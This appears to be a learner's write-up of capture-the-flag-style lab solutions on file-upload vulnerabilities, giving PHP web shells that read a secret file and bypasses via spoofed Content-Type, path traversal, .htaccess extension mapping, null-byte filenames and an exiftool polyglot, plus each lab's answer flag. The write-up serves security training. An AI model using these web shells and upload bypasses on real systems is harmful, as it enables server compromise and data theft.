### Remote code execution via web shell upload

I need to upload a PHP web shell, and get the contents of /home/carlos/secret

I uploaded this shell:
```php
<?php
	$output = shell_exec('cat /home/carlos/secret');
	echo "<pre>$output</pre>";
?>
```

Answer: `cAzbIo9fYoVtxfOLqigF6adiLmwMzqmL`

---
### Web shell upload via Content-Type restriction bypass

I need to upload a PHP web shell, and get the contents of /home/carlos/secret

We use the same code snippet as before, but in this case, we modified the header, from this:
`Content-Type: application/x-php` to this: `Content-Type: image/jpeg`

Answer: `H1GYaB6KL7VDZHNwiTUkEu2BSk5Ep1bG`

---
### Web shell upload via path traversal

I need to upload a PHP web shell, and get the contents of /home/carlos/secret, but to do it I need to exploit first a path traversal vulnerability.

This is achieved by changing a header , from this:
`Content-Disposition; form-data; name="avatar"; filename="web.php"` to this: 
`Content-Disposition: form-data; name="avatar"; filename="..%2fweb.php"` with the '/'  url encoded 

Answer: `NjjgMnVgkE48DCLED7ki4jLQmjHFmUm6`

> Personal Note: Trust yourself, just give it a little work around sometimes. 

---
### Web shell upload via extension blacklist bypass

I need to upload a PHP web shell, and get the contents of /home/carlos/secret, but to do it I need to avoid a file extension filter.

This is achieved by changing the filename value in the header `Content-Disposition`: `filename=.htaccess` and the header `Content-Type: text/plain`

This will be my payload instead of my php code: `AddType application/x-httpd-php .l33t`

>This maps an arbitrary extension (`.l33t`) to the executable MIME type `application/x-httpd-php`. As the server uses the `mod_php` module, it knows how to handle this already.

After doing this, we replace the body for our original php payload, and change the filename to "exploit.l33t". We'll see the successful upload, and in the other tab we can call the file with `/files/avatars/exploit.l33t`

Answer: `Jn0unw5oBfHYpQ3HXvYyvXNRzlDAr13e`

Explanation: We are uploading a `.htaccess` file, with some directives specifying how to "interpret" the .l33t extension. After that, we can upload our extension will be trated as a php.

---
### Web shell upload via obfuscated file extension

After log in, upload a new avatar, and see the GET request is to /files/avatar/YOUR_IMAGE. 

Create a php file with the following content: `<?php echo file_get_contents('/home/carlos/secret'); ?>`

If you try to upload this file, you will see it's impossible because it's validating the file extension. So we'll use the null byte technique

Try to upload your php file, intercept the POST request and modify the filename to `exploit.php%00.jpg` and it will say 200 OK.

Now use your GET to call your already uploaded file. 

Answer: `q33uFOQBf2iUFNTxNqkx9O2jHNr9Sx9y`

---
### Remote code execution via polyglot web shell upload

If you try to upload the "exploit.php" file with the command execution, is not possible. So, using exiftool we can do a polyglot as follows: 

``exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php``

If you use the GET request to get your file "polyglot.php" you can see the answer and look for "START" and "END". The answer will be between those words.

Answer: `2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ`